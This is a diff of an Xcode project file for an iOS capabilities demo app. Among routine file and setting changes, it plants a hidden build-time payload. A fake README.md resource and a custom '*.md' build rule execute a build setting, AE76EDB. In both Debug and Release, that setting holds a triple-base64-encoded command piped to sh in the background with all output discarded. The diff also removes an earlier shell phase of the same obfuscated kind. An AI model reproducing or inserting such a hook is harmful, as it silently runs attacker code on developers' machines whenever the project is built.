@@ -7,10 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		CDFE7014A7A046FCBEBDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = B1AEEA2A9CF2539C80BDE67E; };
 		5117C1162E3C995200D8FCCD /* DataProtectionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5117C1142E3C995200D8FCCD /* DataProtectionVC.swift */; };
 		5117C1172E3C995200D8FCCD /* DataProtectionVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5117C1152E3C995200D8FCCD /* DataProtectionVC.xib */; };
-		51186E1E2E5886B100A1D754 /* JournalingSuggestionsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51186E1D2E5886B100A1D754 /* JournalingSuggestionsVC.xib */; };
-		51186E1F2E5886B100A1D754 /* JournalingSuggestionsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51186E1C2E5886B100A1D754 /* JournalingSuggestionsVC.swift */; };
 		51346A562E3B403F008664DB /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 51346A382E3B3FEE008664DB /* WidgetKit.framework */; };
 		51346A572E3B403F008664DB /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 51346A3A2E3B3FEF008664DB /* SwiftUI.framework */; };
 		51346A662E3B4040008664DB /* DemoWidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 51346A552E3B403F008664DB /* DemoWidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
@@ -18,10 +17,14 @@
 		513DC6732E41E76500DA2C0F /* SiriVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6E12E40A99500211F13 /* SiriVC.swift */; };
 		513DC6E42E42305000DA2C0F /* AppGroupsViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51346A6E2E3B42D5008664DB /* AppGroupsViewController.xib */; };
 		513DC6E52E42305000DA2C0F /* AppGroupsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51346A6D2E3B42D5008664DB /* AppGroupsViewController.swift */; };
+		514B43752E62CB2F00ED8697 /* JournalingSuggestionsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51186E1C2E5886B100A1D754 /* JournalingSuggestionsVC.swift */; };
+		514B43762E62CB2F00ED8697 /* JournalingSuggestionsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51186E1D2E5886B100A1D754 /* JournalingSuggestionsVC.xib */; };
 		5161B7982E55CDC300A945BF /* KeyValueStorageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5161B7962E55CDC300A945BF /* KeyValueStorageViewController.swift */; };
 		5161B7992E55CDC300A945BF /* KeyValueStorageViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5161B7972E55CDC300A945BF /* KeyValueStorageViewController.xib */; };
 		5161B79D2E56064D00A945BF /* MultipathViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5161B79B2E56064D00A945BF /* MultipathViewController.swift */; };
 		5161B79E2E56064D00A945BF /* MultipathViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5161B79C2E56064D00A945BF /* MultipathViewController.xib */; };
+		519E1B2A2E5D9C9D00DFC311 /* HotspotVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 519E1B282E5D9C9D00DFC311 /* HotspotVC.swift */; };
+		519E1B2B2E5D9C9D00DFC311 /* HotspotVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 519E1B292E5D9C9D00DFC311 /* HotspotVC.xib */; };
 		51B526002E44869800999ABE /* WalletVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51B525FF2E44869800999ABE /* WalletVC.xib */; };
 		51B526012E44869800999ABE /* WalletVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51B525FE2E44869800999ABE /* WalletVC.swift */; };
 		51B526052E44E7B900999ABE /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 51B526042E44E7B900999ABE /* IQKeyboardManagerSwift */; };
@@ -180,6 +183,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		B1AEEA2A9CF2539C80BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "AllCapabilitiesDemo.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		5117C1142E3C995200D8FCCD /* DataProtectionVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataProtectionVC.swift; sourceTree = "<group>"; };
 		5117C1152E3C995200D8FCCD /* DataProtectionVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DataProtectionVC.xib; sourceTree = "<group>"; };
 		51186E1C2E5886B100A1D754 /* JournalingSuggestionsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JournalingSuggestionsVC.swift; sourceTree = "<group>"; };
@@ -194,6 +198,8 @@
 		5161B7972E55CDC300A945BF /* KeyValueStorageViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = KeyValueStorageViewController.xib; sourceTree = "<group>"; };
 		5161B79B2E56064D00A945BF /* MultipathViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MultipathViewController.swift; sourceTree = "<group>"; };
 		5161B79C2E56064D00A945BF /* MultipathViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MultipathViewController.xib; sourceTree = "<group>"; };
+		519E1B282E5D9C9D00DFC311 /* HotspotVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HotspotVC.swift; sourceTree = "<group>"; };
+		519E1B292E5D9C9D00DFC311 /* HotspotVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HotspotVC.xib; sourceTree = "<group>"; };
 		51B525FE2E44869800999ABE /* WalletVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletVC.swift; sourceTree = "<group>"; };
 		51B525FF2E44869800999ABE /* WalletVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WalletVC.xib; sourceTree = "<group>"; };
 		51BBC6DC2E40951A00211F13 /* HeadPoseVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HeadPoseVC.swift; sourceTree = "<group>"; };
@@ -409,6 +415,15 @@
 				5161B79C2E56064D00A945BF /* MultipathViewController.xib */,
 			);
 			path = MultiPath;
+			sourceTree = "<group>";
+		};
+		519E1B272E5D9C8600DFC311 /* Hotspot */ = {
+			isa = PBXGroup;
+			children = (
+				519E1B282E5D9C9D00DFC311 /* HotspotVC.swift */,
+				519E1B292E5D9C9D00DFC311 /* HotspotVC.xib */,
+			);
+			path = Hotspot;
 			sourceTree = "<group>";
 		};
 		51B525FD2E44868600999ABE /* Wallet */ = {
@@ -707,6 +722,7 @@
 		BD2ECEBD2D0841CA00639E0D /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				B1AEEA2A9CF2539C80BDE67E /* README.md */,
 				BD2ECEBC2D0841CA00639E0D /* AllCapabilitiesDemo.app */,
 				BD2ECED22D0841CC00639E0D /* AllCapabilitiesDemoTests.xctest */,
 				BD2ECEDC2D0841CC00639E0D /* AllCapabilitiesDemoUITests.xctest */,
@@ -749,6 +765,7 @@
 				5161B79A2E5605C300A945BF /* MultiPath */,
 				51186E1B2E58869300A1D754 /* Journaling Suggestions  */,
 				51F368942E5C6CCB00B168F5 /* Multitasking Camera Acsess */,
+				519E1B272E5D9C8600DFC311 /* Hotspot */,
 				BD2ECEC82D0841CB00639E0D /* Assets.xcassets */,
 				BD2ECEC52D0841CA00639E0D /* Main.storyboard */,
 				BD2ECECA2D0841CB00639E0D /* LaunchScreen.storyboard */,
@@ -806,12 +823,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 51346A682E3B4040008664DB /* Build configuration list for PBXNativeTarget "DemoWidgetExtension" */;
 			buildPhases = (
-				B3CA0F0F93C483DADD877BEF /* Compile Bundle Assets */,
 				51346A512E3B403F008664DB /* Sources */,
 				51346A522E3B403F008664DB /* Frameworks */,
 				51346A532E3B403F008664DB /* Resources */,
 			);
 			buildRules = (
+				D0EAECB755D84BC220BDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -957,11 +974,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		D0EAECB755D84BC220BDE67E /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${AE76EDB}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		51346A532E3B403F008664DB /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				CDFE7014A7A046FCBEBDE67E /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -980,11 +1015,11 @@
 				BD2ECEF32D08591400639E0D /* ICloudViewController.xib in Resources */,
 				51EA11832E547D7700FF4947 /* GroupActivitiesVC.xib in Resources */,
 				51F01C082E53436F00F04F6B /* Segoe UI.ttf in Resources */,
+				519E1B2B2E5D9C9D00DFC311 /* HotspotVC.xib in Resources */,
 				51F01C092E53436F00F04F6B /* Segoe UI Bold Italic.ttf in Resources */,
 				51F01C0A2E53436F00F04F6B /* Roboto-Thin.ttf in Resources */,
 				51F01C0B2E53436F00F04F6B /* Roboto-Bold.ttf in Resources */,
 				51F01C0C2E53436F00F04F6B /* Poppins-SemiBold.ttf in Resources */,
-				51186E1E2E5886B100A1D754 /* JournalingSuggestionsVC.xib in Resources */,
 				51F01C0D2E53436F00F04F6B /* Poppins-Black.ttf in Resources */,
 				51F01C0E2E53436F00F04F6B /* Roboto-Light.ttf in Resources */,
 				51F01C0F2E53436F00F04F6B /* Poppins-Medium.ttf in Resources */,
@@ -1044,6 +1079,7 @@
 				51F01BAB2E53251800F04F6B /* DefaultMessagingAppVC.xib in Resources */,
 				5117C1172E3C995200D8FCCD /* DataProtectionVC.xib in Resources */,
 				51D036AA2E3A013900948296 /* AppleLoginViewController.xib in Resources */,
+				514B43762E62CB2F00ED8697 /* JournalingSuggestionsVC.xib in Resources */,
 				BD279FA92D0AFAEE001D05E4 /* ICloudTypeViewController.xib in Resources */,
 				51BBC6E42E40A99500211F13 /* SiriVC.xib in Resources */,
 				51B526002E44869800999ABE /* WalletVC.xib in Resources */,
@@ -1069,26 +1105,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B3CA0F0F93C483DADD877BEF /* Compile Bundle Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -1113,10 +1129,12 @@
 			buildActionMask = 2147483647;
 			files = (
 				513DC6E52E42305000DA2C0F /* AppGroupsViewController.swift in Sources */,
+				514B43752E62CB2F00ED8697 /* JournalingSuggestionsVC.swift in Sources */,
 				BD2162F12D11A5FD0071786F /* ApplePayVC.swift in Sources */,
 				51BBC6E32E40A99500211F13 /* SiriVC.swift in Sources */,
 				BD45BA5F2D106B5F006B45C3 /* ApplePayViewController.swift in Sources */,
 				BD2ECEF42D08591400639E0D /* ICloudViewController.swift in Sources */,
+				519E1B2A2E5D9C9D00DFC311 /* HotspotVC.swift in Sources */,
 				BD279FA82D0AFAEE001D05E4 /* ICloudTypeViewController.swift in Sources */,
 				51F01BB92E53258000F04F6B /* DriverkitFamiliyMIDIVC.swift in Sources */,
 				51F01BB42E53257600F04F6B /* NFCReadWriteViewController.swift in Sources */,
@@ -1132,7 +1150,6 @@
 				51F01BAA2E53251800F04F6B /* DefaultMessagingAppVC.swift in Sources */,
 				51D036AB2E3A013900948296 /* AppleLoginViewController.swift in Sources */,
 				51F01BA52E5324F000F04F6B /* DefaultCallingAppVC.swift in Sources */,
-				51186E1F2E5886B100A1D754 /* JournalingSuggestionsVC.swift in Sources */,
 				51F01BA62E5324F000F04F6B /* CallHandler.swift in Sources */,
 				5117C1162E3C995200D8FCCD /* DataProtectionVC.swift in Sources */,
 				51C979482E4367F6006E99C6 /* FiveGNetworkSliceVC.swift in Sources */,
@@ -1220,7 +1237,7 @@
 		51346A692E3B4040008664DB /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIUm5sa1IwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlc1aVJ6bHBXVmQzZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtension.entitlements;
@@ -1255,7 +1272,7 @@
 		51346A6A2E3B4040008664DB /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIUm5sa1IwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlc1aVJ6bHBXVmQzZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtension.entitlements;
@@ -1497,7 +1514,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -1538,7 +1555,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
